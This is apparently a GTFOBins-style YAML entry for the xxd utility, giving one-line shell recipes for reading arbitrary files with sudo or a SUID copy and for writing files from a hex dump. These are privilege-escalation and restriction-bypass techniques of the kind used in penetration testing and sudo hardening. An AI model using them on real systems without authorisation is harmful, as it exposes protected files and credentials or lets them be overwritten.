---
functions:
  sudo-enabled:
    - code: |
        LFILE=file_to_read
        sudo xxd "$LFILE" | xxd -r
  suid-enabled:
    - code: |
        LFILE=file_to_read
        ./xxd "$LFILE" | xxd -r
  file-read:
    - code: |
        LFILE=file_to_read
        xxd "$LFILE" | xxd -r
  file-write:
    - description: The content of the file to write is given in hex dump (`data\n` is `646174610a`)
      code: |
        LFILE=file_to_write
        echo "0: 646174610a" | xxd -r - "$LFILE"
---
